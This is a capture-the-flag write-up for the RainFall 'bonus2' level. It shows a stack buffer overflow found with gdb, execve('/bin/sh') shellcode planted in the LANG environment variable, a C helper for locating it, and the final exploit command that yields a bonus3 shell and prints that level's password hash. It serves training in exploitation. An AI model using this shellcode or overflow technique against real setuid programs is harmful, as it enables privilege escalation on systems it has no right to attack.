## **Analysis**

**In `main()` :**

```bash
bonus2@RainFall:~$ export LANG=$(python -c 'print "fi"')

bonus2@RainFall:~$ gdb bonus2

(gdb) run $(python -c 'print "A" * 40') $(python -c 'print "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz"')
...
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH

Program received signal SIGSEGV, Segmentation fault.
0x46464545 in ?? ()
```

```bash
 ❯ python3 offset.py 45
16
 ❯ python3 offset.py 46
20
```

Offset : 18

We create the shellcode in te env variable `LANG`
```bash
export LANG=$(python -c 'print "fi" + "\x90" * 14 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"')
```

> vim /tmp/getenv.c
```c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char** argv)
{
    printf("env address at %p\n", getenv(argv[1]));
    return (0);
}
```
> gcc /tmp/getenv.c -o /tmp/getenv
> 
```bash
bonus2@RainFall:~$ /tmp/getenv LANG
env address at 0xbfffff07
```

0xbfffff07 + 16 = 0xbfffff17 to skip "fi"

```bash
bonus2@RainFall:~$ ./bonus2 $(python -c 'print "\x90" * 40') $(python -c 'print "\x90" * 18 + "\x17\xff\xff\xbf"')
Hyvää päivää �������������������������������������������������������������
$ whoami
bonus3
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```

___

*Password: 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245*